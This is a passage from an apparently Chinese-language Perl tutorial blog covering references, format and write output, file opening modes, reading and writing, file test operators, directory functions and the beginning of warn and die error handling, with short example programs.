<span class="number">8</span>, <span class="number">9</span>],</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 匿名哈希引用</span></span><br><span class="line">$href= &#123; <span class="string">APR =&gt;</span><span class="number">4</span>, <span class="string">AUG =&gt;</span><span class="number">8</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 匿名子程序引用</span></span><br><span class="line">$coderef = <span class="function"><span class="keyword">sub</span> </span>&#123; <span class="keyword">print</span> <span class="string">"Runoob!\n"</span> &#125;;</span><br></pre></td></tr></table></figure>
<h3 id="取消引用"><a href="#取消引用" class="headerlink" title="取消引用"></a>取消引用</h3><p>根据不同的类型使用 $, @ 或 % 来取消，取得引用指向的值。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$$r</span><br><span class="line">@$r</span><br><span class="line">%$r</span><br></pre></td></tr></table></figure>
<h4 id="判断变量类型"><a href="#判断变量类型" class="headerlink" title="判断变量类型"></a>判断变量类型</h4><p>如果你不能确定变量类型，你可以使用 <strong>ref</strong> 来判断，返回值列表如下，如果没有以下的值返回 false：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SCALAR</span><br><span class="line">ARRAY</span><br><span class="line">HASH</span><br><span class="line">CODE</span><br><span class="line">GLOB</span><br><span class="line">REF</span><br></pre></td></tr></table></figure>
<h3 id="循环引用"><a href="#循环引用" class="headerlink" title="循环引用"></a>循环引用</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> $foo = <span class="number">100</span>;</span><br><span class="line">$foo = \$foo;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Value of foo is : "</span>, $$foo, <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>
<p>result:</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Value of foo is : REF(<span class="number">0x9aae38</span>)</span><br></pre></td></tr></table></figure>
<h3 id="引用函数"><a href="#引用函数" class="headerlink" title="引用函数"></a>引用函数</h3><p>调用引用函数格式: &amp; + 创建的引用名</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建函数的引用</span></span><br><span class="line">$cref = \&amp;PrintHash;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 使用引用调用函数</span></span><br><span class="line">&amp;$cref(%hash);</span><br></pre></td></tr></table></figure>
<h2 id="Perl-格式化输出"><a href="#Perl-格式化输出" class="headerlink" title="Perl 格式化输出"></a>Perl 格式化输出</h2><p>Perl 中可以使用 format 来定义一个模板，然后使用 write 按指定模板输出数据。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">format</span> FormatName =</span><br><span class="line">fieldline</span><br><span class="line">value_one, value_two, value_three</span><br><span class="line">fieldline</span><br><span class="line">value_one, value_two</span><br><span class="line">.</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>FormatName</strong> ：格式化名称。</li>
<li><strong>fieldline</strong> ：一个格式行，用来定义一个输出行的格式,类似 @,^,&lt;,&gt;,| 这样的字符。</li>
<li><strong>value_one,value_two……</strong> ：数据行，用来向前面的格式行中插入值,都是perl的变量。</li>
<li><strong>.</strong> ：结束符号。</li>
</ul>
<p><strong>格式行(图形行)语法</strong></p>
<ul>
<li>格式行以 @ 或者 ^ 开头，这些行不作任何形式的变量代换。</li>
<li>@ 字段是普通的字段。</li>
<li>@,^ 后的 &lt;, &gt;,| 长度决定了字段的长度，如果变量超出定义的长度,那么它将被截断。</li>
<li>&lt;, &gt;,| 还分别表示,左对齐,右对齐,居中对齐。</li>
<li>^ 字段用于多行文本块填充。</li>
</ul>
<table>
<thead>
<tr>
<th>格式</th>
<th>值域含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>@&lt;&lt;&lt;</td>
<td>左对齐输出</td>
</tr>
<tr>
<td>@&gt;&gt;&gt;</td>
<td>右对齐输出</td>
</tr>
<tr>
<td>@\</td>
<td>\</td>
<td>\</td>
<td></td>
<td>中对齐输出</td>
</tr>
<tr>
<td>@##.##</td>
<td>固定精度数字</td>
</tr>
<tr>
<td>@*</td>
<td>多行文本</td>
</tr>
</tbody>
</table>
<p>示例：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">format</span> EMPLOYEE =</span><br><span class="line">===================================</span><br><span class="line">@&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; @&lt;&lt; </span><br><span class="line">$name, $age</span><br><span class="line">@#<span class="comment">####.##</span></span><br><span class="line">$salary</span><br><span class="line">===================================</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span>(STDOUT);</span><br><span class="line">$~ = EMPLOYEE;</span><br><span class="line"></span><br><span class="line">@n = (<span class="string">"Ali"</span>, <span class="string">"Runoob"</span>, <span class="string">"Jaffer"</span>);</span><br><span class="line">@a  = (<span class="number">20</span>,<span class="number">30</span>, <span class="number">40</span>);</span><br><span class="line">@s = (<span class="number">2000.00</span>, <span class="number">2500.00</span>, <span class="number">4000.000</span>);</span><br><span class="line"></span><br><span class="line">$i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">foreach</span> (@n)&#123;</span><br><span class="line">    $name = $_;</span><br><span class="line">    $age = $a[$i];</span><br><span class="line">    $salary = $s[$i++];</span><br><span class="line">    <span class="keyword">write</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果为：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">===================================</span><br><span class="line">Ali                     <span class="number">20</span></span><br><span class="line">  <span class="number">2000.00</span></span><br><span class="line">===================================</span><br><span class="line">===================================</span><br><span class="line">Runoob                  <span class="number">30</span></span><br><span class="line">  <span class="number">2500.00</span></span><br><span class="line">===================================</span><br><span class="line">===================================</span><br><span class="line">Jaffer                  <span class="number">40</span></span><br><span class="line">  <span class="number">4000.00</span></span><br><span class="line">===================================</span><br></pre></td></tr></table></figure>
<p><strong>格式变量</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$~ ($FORMAT_NAME) ：格式名字 $^ ($FORMAT_TOP_NAME) ：当前的表头格式名字</span><br><span class="line">$% ($FORMAT_PAGE_NUMBER) ：当前输出的页号</span><br><span class="line">$= ($FORMAT_LINES_PER_PAGE) ：每页中的行数</span><br><span class="line">$| ($FORMAT_AUTOFLUSH) ：是否自动刷新输出缓冲区存储</span><br><span class="line">$^L ($FORMAT_FORMFEED) ：在每一页(除了第一页)表头之前需要输出的字符串存储在</span><br></pre></td></tr></table></figure>
<p>还有一些知识点，自行百度吧。</p>
<h2 id="Perl-文件操作"><a href="#Perl-文件操作" class="headerlink" title="Perl 文件操作"></a>Perl 文件操作</h2><p>Perl 使用一种叫做文件句柄类型的变量来操作文件。</p>
<p>文件句柄(file handle)是一个I/O连接的名称。</p>
<p>Perl提供了三种文件句柄:STDIN,STDOUT,STDERR。</p>
<h3 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h3><p>Perl 中打开文件可以使用以下方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">open FILEHANDLE, EXPR</span><br><span class="line">open FILEHANDLE</span><br><span class="line"></span><br><span class="line">sysopen FILEHANDLE, FILENAME, MODE, PERMS</span><br><span class="line">sysopen FILEHANDLE, FILENAME, MODE</span><br></pre></td></tr></table></figure>
<p>参数说明:</p>
<ul>
<li>FILEHANDLE：文件句柄，用于存放一个文件唯一标识符。</li>
<li>EXPR：文件名及文件访问类型组成的表达式。</li>
<li>MODE：文件访问类型。</li>
<li>PERMS：访问权限位(permission bits)。</li>
</ul>
<h4 id="open-函数"><a href="#open-函数" class="headerlink" title="open 函数"></a>open 函数</h4><p>打开文件并读取内容：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">open</span>(DATA, <span class="string">"&lt;file.txt"</span>) || <span class="keyword">die</span> <span class="string">"file.txt 文件无法打开, $!"</span>;</span><br><span class="line"><span class="keyword">while</span>(&lt;DATA&gt;)&#123;</span><br><span class="line">   <span class="keyword">print</span> <span class="string">"$_"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>模式</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>&lt; 或 r</td>
<td>只读方式打开，将文件指针指向文件头。</td>
</tr>
<tr>
<td>&gt; 或 w</td>
<td>写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建之。</td>
</tr>
<tr>
<td>&gt;&gt; 或 a</td>
<td>写入方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之。</td>
</tr>
<tr>
<td>+&lt; 或 r+</td>
<td>读写方式打开，将文件指针指向文件头。</td>
</tr>
<tr>
<td>+&gt; 或 w+</td>
<td>读写方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建之。</td>
</tr>
<tr>
<td>+&gt;&gt; 或 a+</td>
<td>读写方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之。</td>
</tr>
</tbody>
</table>
<h4 id="Sysopen函数"><a href="#Sysopen函数" class="headerlink" title="Sysopen函数"></a>Sysopen函数</h4><p><strong>sysopen</strong> 函数类似于 open 函数，只是它们的参数形式不一样。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sysopen</span> FILEHANDLE, FILENAME, MODE, PERMS</span><br><span class="line"><span class="keyword">sysopen</span>(DATA, <span class="string">"file.txt"</span>, O_RDWR|O_TRUNC );</span><br></pre></td></tr></table></figure>
<p><strong>PERMS</strong> 参数为八进制属性值，表示文件创建后的权限，默认为 <strong>0x666</strong>。</p>
<table>
<thead>
<tr>
<th>模式</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>O_RDWR</td>
<td>读写方式打开，将文件指针指向文件头。</td>
</tr>
<tr>
<td>O_RDONLY</td>
<td>只读方式打开，将文件指针指向文件头。</td>
</tr>
<tr>
<td>O_WRONLY</td>
<td>写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建之。</td>
</tr>
<tr>
<td>O_CREAT</td>
<td>创建文件</td>
</tr>
<tr>
<td>O_APPEND</td>
<td>追加文件</td>
</tr>
<tr>
<td>O_TRUNC</td>
<td>将文件大小截为零</td>
</tr>
<tr>
<td>O_EXCL</td>
<td>如果使用O_CREAT时文件存在,就返回错误信息,它可以测试文件是否存在</td>
</tr>
<tr>
<td>O_NONBLOCK</td>
<td>非阻塞I/O使我们的操作要么成功，要么立即返回错误，不被阻塞。</td>
</tr>
</tbody>
</table>
<h4 id="Close-函数"><a href="#Close-函数" class="headerlink" title="Close 函数"></a>Close 函数</h4><p>FILEHANDLE 为指定的文件句柄，如果成功关闭则返回 true。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">close</span>(DATA) || <span class="keyword">die</span> <span class="string">"无法关闭文件"</span>;</span><br></pre></td></tr></table></figure>
<h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><h4 id="lt-FILEHANDL-gt-操作符"><a href="#lt-FILEHANDL-gt-操作符" class="headerlink" title="&lt;FILEHANDL&gt;操作符"></a><code>&lt;FILEHANDL&gt;</code>操作符</h4><p>从打开的文件句柄读取信息的主要方法是 <code>&lt;FILEHANDLE&gt;</code> 操作符。在标量上下文中，它从文件句柄返回单一行。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name = &lt;STDIN&gt;; <span class="comment">#从标准输入读取一行</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"名字：$name\n"</span>;</span><br></pre></td></tr></table></figure>
<p>当我们使用 <code>&lt;FILEHANDLE&gt;</code> 操作符时，它会返回文件句柄中每一行的列表</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">open</span>(DATA,<span class="string">"&lt;import.txt"</span>) <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"无法打开数据"</span>;</span><br><span class="line">@lines = &lt;DATA&gt;;</span><br><span class="line"><span class="keyword">print</span> @lines;    <span class="comment"># 输出数组内容</span></span><br></pre></td></tr></table></figure>
<h4 id="getc-函数"><a href="#getc-函数" class="headerlink" title="getc 函数"></a>getc 函数</h4><p>xgetc 函数从指定的 FILEHANDLE 返回单一的字符，如果没指定返回 STDIN：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">getc</span> FILEHANDLE</span><br><span class="line"><span class="keyword">getc</span></span><br></pre></td></tr></table></figure>
<p>如果发生错误，或在文件句柄在文件末尾，则返回 undef。</p>
<h4 id="read-函数"><a href="#read-函数" class="headerlink" title="read 函数"></a>read 函数</h4><p>read 函数用于从缓冲区的文件句柄读取信息。</p>
<p>这个函数用于从文件读取二进制数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read FILEHANDLE, SCALAR, LENGTH, OFFSET</span><br><span class="line">read FILEHANDLE, SCALAR, LENGTH</span><br></pre></td></tr></table></figure>
<p>参数说明:</p>
<ul>
<li>FILEHANDLE：文件句柄，用于存放一个文件唯一标识符。</li>
<li>SCALAR：存贮结果，如果没有指定OFFSET，数据将放在SCALAR的开头。否则数据放在SCALAR中的OFFSET字节之后。</li>
<li>LENGTH：读取的内容长度。</li>
<li>OFFSET：偏移量。</li>
</ul>
<p>如果读取成功返回读取的字节数，如果在文件结尾返回 0，如果发生错误返回 undef。</p>
<h4 id="print-函数"><a href="#print-函数" class="headerlink" title="print 函数"></a>print 函数</h4><p>对于所有从文件句柄中读取信息的函数，在后端主要的写入函数为 print：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> FILEHANDLE LIST</span><br><span class="line"><span class="keyword">print</span> LIST</span><br><span class="line"><span class="keyword">print</span></span><br></pre></td></tr></table></figure>
<h3 id="文件拷贝"><a href="#文件拷贝" class="headerlink" title="文件拷贝"></a>文件拷贝</h3><p>以下实例我们将打开一个已存在的文件 file1.txt ，并读取它的每一行写入到文件 file2.txt 中：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只读方式打开文件</span></span><br><span class="line"><span class="keyword">open</span>(DATA1, <span class="string">"&lt;file1.txt"</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 打开新文件并写入</span></span><br><span class="line"><span class="keyword">open</span>(DATA2, <span class="string">"&gt;file2.txt"</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 拷贝数据</span></span><br><span class="line"><span class="keyword">while</span>(&lt;DATA1&gt;)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">print</span> DATA2 $_;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">close</span>( DATA1 );</span><br><span class="line"><span class="keyword">close</span>( DATA2 );</span><br></pre></td></tr></table></figure>
<h3 id="文件重命名"><a href="#文件重命名" class="headerlink" title="文件重命名"></a>文件重命名</h3><p>以下实例，我们将已存在的文件 file1.txt 重命名为 file2.txt，指定的目录是在 /usr/runoob/test/ 下：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">rename</span> (<span class="string">"/usr/test/file1.txt"</span>, <span class="string">"/usr/test/file2.txt"</span> );</span><br></pre></td></tr></table></figure>
<p>函数 <strong>renames</strong> 只接受两个参数，只对已存在的文件进行重命名。</p>
<h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unlink</span> (<span class="string">"/usr/runoob/test/file1.txt"</span>);</span><br></pre></td></tr></table></figure>
<h3 id="指定文件位置"><a href="#指定文件位置" class="headerlink" title="指定文件位置"></a>指定文件位置</h3><p>你可以使用 <strong>tell</strong> 函数来获取文件的位置，并通过使用 <strong>seek</strong> 函数来指定文件内的的位置：</p>
<h4 id="tell-函数"><a href="#tell-函数" class="headerlink" title="tell 函数"></a>tell 函数</h4><p>tell 函数用于获取文件位置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tell FILEHANDLE</span><br><span class="line">tell</span><br></pre></td></tr></table></figure>
<p>如果指定 FILEHANDLE 该函数返回文件指针的位置，以字节计。如果没有指定则返回默认选取的文件句柄。</p>
<h4 id="seek-函数"><a href="#seek-函数" class="headerlink" title="seek 函数"></a>seek 函数</h4><p>seek()函数是通过文件句柄来移动文件读写指针的方式来读取或写入文件的，以字节为单位进行读取和写入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seek FILEHANDLE, POSITION, WHENCE</span><br></pre></td></tr></table></figure>
<p>参数说明:</p>
<ul>
<li>FILEHANDLE：文件句柄，用于存放一个文件唯一标识符。</li>
<li>POSITION：表示文件句柄(读写位置指针)要移动的字节数。</li>
<li>WHENCE：表示文件句柄(读写位置指针)开始移动时的起始位置，可以取的值为0、1、2；分别表示文件开头、当前位置和文件尾。</li>
</ul>
<p>以下实例为从文件开头读取 256 个字节：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seek DATA, 256, 0;</span><br></pre></td></tr></table></figure>
<h3 id="文件信息"><a href="#文件信息" class="headerlink" title="文件信息"></a>文件信息</h3><p>Perl 的文件操作也可以先测试文件是否存在，是否可读写等。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> $file = <span class="string">"/usr/test/runoob/file1.txt"</span>;</span><br><span class="line"><span class="keyword">my</span> (@description, $size);</span><br><span class="line"><span class="keyword">if</span> (-e $file)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">push</span> @description, <span class="string">'是一个二进制文件'</span> <span class="keyword">if</span> (-B <span class="number">_</span>);</span><br><span class="line">    <span class="keyword">push</span> @description, <span class="string">'是一个socket(套接字)'</span> <span class="keyword">if</span> (-S <span class="number">_</span>);</span><br><span class="line">    <span class="keyword">push</span> @description, <span class="string">'是一个文本文件'</span> <span class="keyword">if</span> (-T <span class="number">_</span>);</span><br><span class="line">    <span class="keyword">push</span> @description, <span class="string">'是一个特殊块文件'</span> <span class="keyword">if</span> (-b <span class="number">_</span>);</span><br><span class="line">    <span class="keyword">push</span> @description, <span class="string">'是一个特殊字符文件'</span> <span class="keyword">if</span> (-c <span class="number">_</span>);</span><br><span class="line">    <span class="keyword">push</span> @description, <span class="string">'是一个目录'</span> <span class="keyword">if</span> (-d <span class="number">_</span>);</span><br><span class="line">    <span class="keyword">push</span> @description, <span class="string">'文件存在'</span> <span class="keyword">if</span> (-<span class="keyword">x</span> <span class="number">_</span>);</span><br><span class="line">    <span class="keyword">push</span> @description, (($size = -<span class="keyword">s</span> <span class="number">_</span>)) ? <span class="string">"$size 字节"</span> : <span class="string">'空'</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"$file 信息："</span>, <span class="keyword">join</span>(<span class="string">', '</span>,@description),<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>文件测试操作符如下表所示：</p>
<table>
<thead>
<tr>
<th>操作符</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>-A</td>
<td>文件上一次被访问的时间(单位：天)</td>
</tr>
<tr>
<td>-B</td>
<td>是否为二进制文件</td>
</tr>
<tr>
<td>-C</td>
<td>文件的(inode)索引节点修改时间(单位：天)</td>
</tr>
<tr>
<td>-M</td>
<td>文件上一次被修改的时间(单位：天)</td>
</tr>
<tr>
<td>-O</td>
<td>文件被真实的UID所有</td>
</tr>
<tr>
<td>-R</td>
<td>文件或目录可以被真实的UID/GID读取</td>
</tr>
<tr>
<td>-S</td>
<td>为socket(套接字)</td>
</tr>
<tr>
<td>-T</td>
<td>是否为文本文件</td>
</tr>
<tr>
<td>-W</td>
<td>文件或目录可以被真实的UID/GID写入</td>
</tr>
<tr>
<td>-X</td>
<td>文件或目录可以被真实的UID/GID执行</td>
</tr>
<tr>
<td>-b</td>
<td>为block-special (特殊块)文件(如挂载磁盘)</td>
</tr>
<tr>
<td>-c</td>
<td>为character-special (特殊字符)文件(如I/O 设备)</td>
</tr>
<tr>
<td>-d</td>
<td>为目录</td>
</tr>
<tr>
<td>-e</td>
<td>文件或目录名存在</td>
</tr>
<tr>
<td>-f</td>
<td>为普通文件</td>
</tr>
<tr>
<td>-g</td>
<td>文件或目录具有setgid属性</td>
</tr>
<tr>
<td>-k</td>
<td>文件或目录设置了sticky位</td>
</tr>
<tr>
<td>-l</td>
<td>为符号链接</td>
</tr>
<tr>
<td>-o</td>
<td>文件被有效UID所有</td>
</tr>
<tr>
<td>-p</td>
<td>文件是命名管道(FIFO)</td>
</tr>
<tr>
<td>-r</td>
<td>文件可以被有效的UID/GID读取</td>
</tr>
<tr>
<td>-s</td>
<td>文件或目录存在且不为0(返回字节数)</td>
</tr>
<tr>
<td>-t</td>
<td>文件句柄为TTY(系统函数isatty()的返回结果；不能对文件名使用这个测试)</td>
</tr>
<tr>
<td>-u</td>
<td>文件或目录具有setuid属性</td>
</tr>
<tr>
<td>-w</td>
<td>文件可以被有效的UID/GID写入</td>
</tr>
<tr>
<td>-x</td>
<td>文件可以被有效的UID/GID执行</td>
</tr>
<tr>
<td>-z</td>
<td>文件存在，大小为0(目录恒为false)，即是否为空文件，</td>
</tr>
</tbody>
</table>
<h2 id="Perl-目录操作"><a href="#Perl-目录操作" class="headerlink" title="Perl 目录操作"></a>Perl 目录操作</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">opendir</span> DIRHANDLE, EXPR  <span class="comment"># 打开目录</span></span><br><span class="line"><span class="keyword">readdir</span> DIRHANDLE        <span class="comment"># 读取目录</span></span><br><span class="line"><span class="keyword">rewinddir</span> DIRHANDLE      <span class="comment"># 定位指针到开头</span></span><br><span class="line"><span class="keyword">telldir</span> DIRHANDLE        <span class="comment"># 返回目录的当前位置</span></span><br><span class="line"><span class="keyword">seekdir</span> DIRHANDLE, POS   <span class="comment"># 定位指定到目录的 POS 位置</span></span><br><span class="line">closedir DIRHANDLE       <span class="comment"># 关闭目录</span></span><br><span class="line"><span class="keyword">glob</span> 					 <span class="comment"># 显示文件</span></span><br><span class="line">以下需要有足够权限</span><br><span class="line"><span class="keyword">mkdir</span>					 <span class="comment"># 创建目录</span></span><br><span class="line"><span class="keyword">rmdir</span>					 <span class="comment"># 删除目录</span></span><br><span class="line"><span class="keyword">chdir</span>					 <span class="comment"># 切换目录</span></span><br></pre></td></tr></table></figure>
<h3 id="显示文件"><a href="#显示文件" class="headerlink" title="显示文件"></a>显示文件</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 显示 /tmp 和 /home 目录下的所有文件</span></span><br><span class="line">$dir = <span class="string">"/tmp/* /home/*"</span>;</span><br><span class="line">@files = <span class="keyword">glob</span>( $dir );</span><br><span class="line"> </span><br><span class="line"><span class="keyword">foreach</span> (@files )&#123;</span><br><span class="line">   <span class="keyword">print</span> $_ . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示 /tmp 目录下所有以 .c 结尾的文件</span></span><br><span class="line">$dir = <span class="string">"/tmp/*.c"</span>;</span><br><span class="line">@files = <span class="keyword">glob</span>( $dir );</span><br><span class="line"> </span><br><span class="line"><span class="keyword">foreach</span> (@files )&#123;</span><br><span class="line">   <span class="keyword">print</span> $_ . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出当前目录下的所有文件：</span></span><br><span class="line"><span class="keyword">opendir</span> (DIR, <span class="string">'.'</span>) <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"无法打开目录, $!"</span>;</span><br><span class="line"><span class="keyword">while</span> ($file = <span class="keyword">readdir</span> DIR) &#123;</span><br><span class="line">  <span class="keyword">print</span> <span class="string">"$file\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">closedir DIR;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示 /tmp 目录下所有以 .c 结尾的文件</span></span><br><span class="line"><span class="keyword">opendir</span>(DIR, <span class="string">'.'</span>) <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"无法打开目录, $!"</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">sort</span> <span class="keyword">grep</span>(<span class="regexp">/^.*\.c$/</span>,<span class="keyword">readdir</span>(DIR)))&#123;</span><br><span class="line">   <span class="keyword">print</span> <span class="string">"$_\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">closedir DIR;</span><br></pre></td></tr></table></figure>
<h2 id="Perl-错误处理"><a href="#Perl-错误处理" class="headerlink" title="Perl 错误处理"></a>Perl 错误处理</h2><h3 id="warn-die-函数"><a href="#warn-die-函数" class="headerlink" title="warn / die 函数"></a>warn / die 函数</h3><p><strong>warn</strong> 函数用于触发一个警告信息，不会有其他操作，输出到 STDERR(标准输出文件)，</p>
<p><strong>die</strong> 函数类似于 warn, 但它会执行退出。</p>
